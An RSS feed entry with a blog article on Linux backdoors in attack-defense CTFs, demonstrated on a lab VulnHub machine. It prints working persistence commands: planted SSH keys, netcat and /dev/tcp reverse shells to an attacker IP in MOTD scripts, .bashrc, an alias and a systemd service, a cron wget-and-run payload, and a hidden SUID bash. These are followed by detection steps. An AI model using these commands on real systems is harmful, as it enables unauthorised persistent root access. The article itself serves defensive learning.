<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Security on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/security/</link>
    <description>Recent content in Security on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Tue, 25 May 2021 18:49:35 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/security/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Linux Backdoors and Where to Find Them</title>
      <link>https://fahmifj.github.io/articles/linux-backdoors-and-where-to-find-them/</link>
      <pubDate>Tue, 25 May 2021 18:49:35 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/articles/linux-backdoors-and-where-to-find-them/</guid>
      <description>Learning about backdoor techniques and how to deal with them</description>
      <content:encoded><![CDATA[<p>In Attack-Defense CTF, leaving backdoors is an important part of maintaining access to the target system. As a result, learning some of the backdoor techniques is essential, not only for attackers but also for defenders.</p>
<h2 id="backdoor-what-is-it">Backdoor, what is it?</h2>
<p>Simply put, a backdoor is like a secret entrance that lets you access a system without going through the usual authentication steps. It could be a hidden piece of code, a script, or a program placed on the system for the sake of persistence. Basically, it gives you quick and easy access, even if the initial access point gets patched.</p>
<h2 id="as-defenders-why-should-we-care">As defenders, why should we care?</h2>
<p>Of course! It’s like playing chess; if you can anticipate your opponent’s moves, you&rsquo;re more likely to win the game. It&rsquo;s worth to learn the attackers&rsquo; sneaky methods to protects your systems effectively.</p>
<h2 id="common-backdoor-techniques">Common Backdoor Techniques</h2>
<p>Now that we know what a backdoor is and why it&rsquo;s helpful for defenders to know how to one step ahead. So let&rsquo;s find out!</p>
<p>For this demonstration, I will be using the <a href="https://www.vulnhub.com/entry/pinkys-palace-v1,225/"target="_blank" rel="noopener noreferrer"
>Pinky’s Palace</a> machine from VulnHub as our victim server and let&rsquo;s assume it has been completely compromised.</p>
<h3 id="1-ssh-backdoor-authorized_keys-file">1. SSH Backdoor: authorized_keys file</h3>
<p>The <a href="https://www.ssh.com/academy/ssh/authorized_keys/openssh"target="_blank" rel="noopener noreferrer"
>authorized_keys</a> file, located at <code>~/.ssh/authorized_keys</code>, contains a list of public keys that are used for authenticating users.  These keys correspond to specific individuals who are authorized to lo  in to a particular account on your server. Attackers could use that file for backdoor by inserting their own public keys. By doing so, they could falsely authorize themselves and gain instant access to the system  through SSH.</p>
<p>Now let&rsquo;s have a look at the image below which shows the exploitation steps to gain root access on the victim&rsquo;s server (Pinky&rsquo;s Palace).</p>
<p><div class="img-container"><img src="imgs/image-20210526004056632.png" alt="image-20210526004056632"  /></div>
</p>
<p>As an attacker, you don&rsquo;t want to repeat all these exploitation steps all over again to gain root access.</p>
<p>Instead, on the attacking machine, we can generate a new pair of <a href="https://medium.com/risan/upgrade-your-ssh-key-to-ed25519-c6e8d60d3c54"target="_blank" rel="noopener noreferrer"
>SSH keys</a> for backdoor purpose with the following command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ ssh-keygen -a <span class="m">50</span> -t ed25519 -f backdoor_ssh -q -N <span class="s2">&#34;&#34;</span>
</span></span></code></pre></div><p>It will produce 2 files: one is a private key (<code>backdoor_ssh</code>) and the other is a public key (<code>backdoor_ssh.pub</code>).</p>
<p>By inserting the public key (<code>backdoor_ssh.pub</code>) into the <code>authorized_keys</code> file of the root of our victim server, we have authorized ourselves to gain root access via SSH.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pinkys-palace:~# mkdir -p /root/.ssh/ <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s1">&#39;ssh-ed25519 AAAAC3NzaC1lZ.... root@kali&#39;</span> &gt; /root/.ssh/authorized_keys
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210526005156382.png" alt="image-20210526005156382"  /></div>
</p>
<h3 id="2-ssh-backdoor--motd">2. SSH Backdoor:  MOTD</h3>
<p><strong>Motd</strong> (Message of the day) is the banner that appears when you log in to a server using SSH. It displays messages about system informations to users. The message can be customized, which you can find, on most Debian-based distro, under <code>/etc/update-motd.d/</code>. By default, regular users don&rsquo;t have write permission on that directory.</p>
<blockquote>
<p>This is one of the cool tricks I&rsquo;ve learned from HackTheBox machine called <a href="https://www.hackthebox.eu/home/machines/profile/233"target="_blank" rel="noopener noreferrer"
>Traceback.</a></p>
</blockquote>
<p>In the image below image, there is only one <strong>motd</strong> script called <code>10-uname</code>. As I login into the machine using SSH, the output of the script  gets printed.</p>
<p><div class="img-container"><img src="imgs/image-20210526010220513.png" alt="image-20210526010220513"  /></div>
</p>
<p>As an attacker with root access, I could place a new script, such as a <a href="https://www.techslang.com/definition/what-is-a-reverse-shell/"target="_blank" rel="noopener noreferrer"
>reverse shell</a>, in the <code>/etc/update-motd.d</code> directory as a backdoor. Then, I could simply set up a netcat listener to maintain access later.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pinkys-palace:/etc/update-motd.d# <span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/sh\nnc 192.168.2.103 9001 -e /bin/bash &amp;&#39;</span> &gt; 20-backdoor <span class="o">&amp;&amp;</span> chmod +x 20-backdoor
</span></span></code></pre></div><p>If someone logs in to the server via SSH, the backdoor script would be executed and would connect back to my netcat listener, giving me root shell access.</p>
<p><div class="img-container"><img src="imgs/image-20210526010934360.png" alt="image-20210526010934360"  /></div>
</p>
<p>In the image above, I simulated an SSH login using low privilege account, but did you notice that I ended up with root access?</p>
<p>Here is the <a href="http://manpages.ubuntu.com/manpages/xenial/en/man5/update-motd.5.htm"target="_blank" rel="noopener noreferrer"
>answer</a>:</p>
<blockquote>
<p>&hellip;</p>
<p>​       Executable scripts in /etc/update-motd.d/* are executed by <strong>pam_motd(8) as the root user</strong> at
​       each login,  and  this information is concatenated in /var/run/motd.<br>
&hellip;</p>
</blockquote>
<h3 id="3-bashrc-file">3. Bashrc file</h3>
<p>The <code>.bashrc</code> file is a script that runs whenever a user starts a new interactive shell session in the Bash shell. A new interactive shell session can be triggered in several ways, here are some common actions that lead to this:</p>
<p><div class="img-container"><img src="imgs/image-20210526005325944.png" alt="image-20210526005325944"  /></div>
</p>
<p>In the image above, I have inserted a non malicious line script <code>echo &quot;I'm triggered&quot;</code> to my <code>.bashrc</code>. But, as an attacker, we could put something like reverse shell into the file and set up another netcat listener to maintain access.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">pinky@pinkys-palace:~$ <span class="nb">echo</span> <span class="s1">&#39;nc 192.168.2.103 9001 -e /bin/bash &gt;/dev/null &amp;&#39;</span> &gt; .bashrc	
</span></span></code></pre></div><p>And then, whenever the user logs in or opens a new terminal session, the backdoor would be executed and connect back to my listener.</p>
<p><div class="img-container"><img src="imgs/image-20210525220025256.png" alt="image-20210525220025256"  /></div>
</p>
<p>It&rsquo;s also possible to insert malicious code wrapped in an alias within the <code>bashrc</code> file. For example:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">alias</span> <span class="nv">cd</span><span class="o">=</span><span class="s1">&#39;$(nc 192.168.2.103 9001 -e /bin/bash&amp;); cd&#39;</span>
</span></span></code></pre></div><p>When a user invokes <code>cd</code>, it actually executes the reverse shell command embedded in the alias first.</p>
<p><div class="img-container"><img src="imgs/image-20210526002305189.png" alt="image-20210526002305189"  /></div>
</p>
<p>Here are some examples of alias backdoors:</p>
<ul>
<li><a href="https://github.com/nisay759/sudo-backdoor"target="_blank" rel="noopener noreferrer"
>https://github.com/nisay759/sudo-backdoor</a></li>
<li><a href="https://gist.github.com/ahhh/1d4bf832c5a88cc75adb"target="_blank" rel="noopener noreferrer"
>https://gist.github.com/ahhh/1d4bf832c5a88cc75adb</a></li>
</ul>
<h3 id="4-cron-job">4. Cron job</h3>
<p>Cron is a feature from Linux/UNIX-like OS that can be used to periodically perform a specific job or task just like Task Scheduler feature in Windows. This feature also becomes an effective vector for maintaining long-term access to a compromised system. For example:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pinkys-palace:~# <span class="nb">echo</span> <span class="s1">&#39;* * * * * root cd /tmp; wget 192.168.2.103/backdoor &amp;&amp; chmod +x backdoor &amp;&amp; ./backdoor&#39;</span> &gt; /etc/cron.d/backdoor
</span></span></code></pre></div><p>What the task above does is it will download a malicious binary called &lsquo;backdoor&rsquo; from my attacking machine, and the backdoor is then executed once every minute.</p>
<p><div class="img-container"><img src="imgs/image-20210625141344607.png" alt="image-20210625141344607"  /></div>
</p>
<p>For stealthy reasons, attackers may even embed the backdoor within the legitimate scheduled tasks.</p>
<h3 id="5-backdoor-as-a-service">5. Backdoor as a Service</h3>
<p>An attacker can also create a backdoor as a service (BaaS). For example:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl"># backdoor.service
</span></span><span class="line"><span class="cl">[Service]
</span></span><span class="line"><span class="cl">Type=simple
</span></span><span class="line"><span class="cl">User=root
</span></span><span class="line"><span class="cl">ExecStart=/bin/bash -c &#34;bash -i &gt;&amp; /dev/tcp/192.168.2.103/9001 0&gt;&amp;1&#34;
</span></span><span class="line"><span class="cl">[Install]
</span></span><span class="line"><span class="cl">WantedBy=multi-user.target&#39;
</span></span></code></pre></div><p>When the service starts, it establishes a reverse shell connection to the attacker’s system which then allows the attacker to remotely control the compromised machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pinkys-palace:/etc/systemd/system# systemctl start backdoor.service
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210526013637397.png" alt="image-20210526013637397"  /></div>
</p>
<p>It can be enabled on boot to ensure that the reverse shell connects back to the attacker’s system automatically each time the compromised machine starts.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pinkys-palace:/etc/systemd/system# systemctl <span class="nb">enable</span> backdoor.service
</span></span></code></pre></div><h3 id="6-suid">6. SUID</h3>
<p>The last one on this post is <a href="https://en.wikipedia.org/wiki/Setuid"target="_blank" rel="noopener noreferrer"
>SUID</a>. SUID allows another user to run an executable binary as the owner of that binary.</p>
<p>For example, I can make a copy of the bash binary (owned by root) called <code>.backdoor</code> (notably starting with a dot to conceal it) and set the SUID permission on it for a low privilege user who has been compromised.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pinkys-palace:/bin# cp bash/home/pinky/.backdoor <span class="o">&amp;&amp;</span> chmod <span class="m">4755</span> /home/pinky/.backdoor
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210526020936681.png" alt="image-20210526020936681"  /></div>
</p>
<h2 id="defenders-side">Defenders Side</h2>
<p>Before proceeding, I want to emphasize that if your server is compromised in real life, it&rsquo;s generally better to restore it from a backup or rebuild it from scratch. This recommendation is based on the fact that backdoors can be obfuscated and may be combined with other techniques, not to mention the possibility of a rootkit being present, making them difficult to detect and remove.</p>
<p>Also what I share here might not be that effective, but here is how I usually deal with backdoors in attack-defense CTF scenarios.</p>
<h3 id="authorized_keys-and-bashrc-file">Authorized_keys and bashrc file</h3>
<p>Make sure to regularly check the all the users <code>authorized_keys</code> file.</p>
<p>In the image below, we see a public key associated with the foreign hostname <code>kali</code> instead of the legitimate <code>pinkys-palace</code>. This difference should raise your suspicion, as it could indicate a potential backdoor.</p>
<p><div class="img-container"><img src="imgs/image-20210605091730851.png" alt="image-20210605091730851"  /></div>
</p>
<p>However, attackers often disguise their keys to appear legitimate. My workaround here is we can create a baseline / &ldquo;skeleton&rdquo; file of the <code>authorized_keys</code> and set a cron job that periodically reverts the file back to its original state. This can be accomplished remotely using <code>scp</code>, ensuring that your baseline file secure.</p>
<blockquote>
<p>You can find the skeleton file of <code>.bashrc</code> at <code>/etc/skel</code>.</p>
</blockquote>
<p>You can apply this approach to <code>.bashrc</code> files as well.</p>
<h3 id="ssh-motd">SSH Motd</h3>
<p>It&rsquo;s not always placed under <code>/etc/update-motd.d/</code>, but make sure the <strong>motd</strong> directory is only writable by root, note the default list of <strong>motd</strong> files and apply the same thing as above (skeleton file) because the attackers might have inserted a backdoor in the original files.</p>
<p>We could also do some &lsquo;forensics&rsquo; using timestamp:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@MSI:/etc/update-motd.d# ls --full-time
</span></span></code></pre></div><p>For example, these files with the timestamp <code>000000000</code> (nano) in the image below have most likely not been modified and are still in their original state since OS installation.</p>
<p><div class="img-container"><img src="imgs/image-20210605092751344.png" alt="image-20210605092751344"  /></div>
</p>
<p>After inserting a non-malicious line, the timestamp changed. From here, it&rsquo;s safe to assume that someone/something has modified it.</p>
<p><div class="img-container"><img src="imgs/image-20210605093121574.png" alt="image-20210605093121574"  /></div>
</p>
<h3 id="cron-jobs-and-services">Cron jobs and Services</h3>
<p>For this one, monitoring is the key.  We can monitor the network sockets and processes using the <code>netstat</code> or the  <code>ss</code> command and the <code>ps</code> command. Be suspicious to any program if it has an IP and port supplied as its arguments. Also make sure these commands aren&rsquo;t aliased by the attackers (like <a href="https://github.com/iamckn/backdoors/blob/master/bd_hide.sh"target="_blank" rel="noopener noreferrer"
>this</a> one).</p>
<p>For this, we can look for any unwanted open ports using this command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ netstat -antp <span class="p">|</span> grep LISTEN
</span></span></code></pre></div><p>To find a suspicious network connection we can use this command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ netstat -antp <span class="p">|</span> grep ESTABLISHED
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210526034616621.png" alt="image-20210526034616621"  /></div>
</p>
<p>When the backdoor fails to reach out the attacker, the state would be displayed as SYN_SENT. To find this we can change the grep part with it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ netstat -antp <span class="p">|</span> grep SYN_SENT
</span></span></code></pre></div><p>Next, we could check each user’s crontab using the following commands:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ <span class="k">for</span> user in <span class="k">$(</span>cat /etc/passwd <span class="p">|</span> cut -f1 -d: <span class="k">)</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> <span class="nv">$user</span><span class="p">;</span> crontab -u <span class="nv">$user</span> -l<span class="p">;</span> <span class="k">done</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Check only the users who have a login shell</span>
</span></span><span class="line"><span class="cl">$ <span class="k">for</span> user in <span class="k">$(</span>cat /etc/passwd <span class="p">|</span> grep sh$ <span class="p">|</span> cut -f1 -d: <span class="k">)</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> <span class="nv">$user</span><span class="p">;</span> crontab -u <span class="nv">$user</span> -l<span class="p">;</span> <span class="k">done</span>
</span></span></code></pre></div><p>There is also the <code>ps -f</code> command which is quite effective at visualizing the process tree. For example, in the image below we can easily identify the &ldquo;culprit&rdquo; that keeps opening the HTTPS port (443) could be in the <code>.bashrc</code> file. It&rsquo;s because the backdoor gets triggered every time we launch a new interactive shell session.</p>
<p><div class="img-container"><img src="imgs/image-20210526034217561.png" alt="image-20210526034217561"  /></div>
</p>
<p>If you prefer the detailed view, consider to use <code>ps auxfww</code> to show process tree with username, TTY, and a wide output.</p>
<p>I also like to use the <code>watch</code> command to actively monitor the network sockets and processes.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1"># monitor process</span>
</span></span><span class="line"><span class="cl">$ watch -n <span class="m">1</span> <span class="s2">&#34;ps auxfww | grep suspected-process&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># monitor net socket</span>
</span></span><span class="line"><span class="cl">$ watch -n <span class="m">1</span> <span class="s2">&#34;netstat -antp&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># monitor net socket with sus IP</span>
</span></span><span class="line"><span class="cl">$ watch -n1 <span class="s2">&#34;ss -atp | grep &#39;10.14\|168.24&#39;&#34;</span>
</span></span></code></pre></div><p>For a backdoor that run as a service, we can try to list all the services with the following command and see if there&rsquo;s an unwanted one.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ systemctl list-unit-files --type<span class="o">=</span>service
</span></span></code></pre></div><p>Or we can also directly visit the services directory. It&rsquo;s depends on what OS the server is using, but we can start to look at  <code>/lib/systemd/</code> and sort them by date modified.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ find /lib/systemd -type f -iname <span class="s1">&#39;*\.service&#39;</span> -exec ls -lrt <span class="s2">&#34;{}&#34;</span> +<span class="p">;</span>
</span></span></code></pre></div><h3 id="finding-suid">Finding SUID</h3>
<p>To find some suspicious SUID we can use the <code>find</code> commands. It can also detect the SUID that started with dot!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pinkys-palace:/etc/update-motd.d# find / -type f -perm <span class="m">4755</span> 2&gt;/dev/null
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210526035623660.png" alt="image-20210526035623660"  /></div>
</p>
<p>However, I realize that I overlooked an important detail in this section. The <code>-perm 4755</code> option will only locate files with exactly those permissions. This means that files with permissions set to <code>4755</code>, <code>4765</code>, <code>4701</code>, and other variations will be excluded from the search. To ensure we can identify all files with the SUID bit set, we should modify the command to:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ find / -type f -perm -u<span class="o">=</span>s 2&gt;/dev/null
</span></span></code></pre></div><p>Okay, that’s all I could share with you, I hope you found the information useful and insightful, If you have any questions or additional insights to share, feel free to reach out.</p>
<p>​</p>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
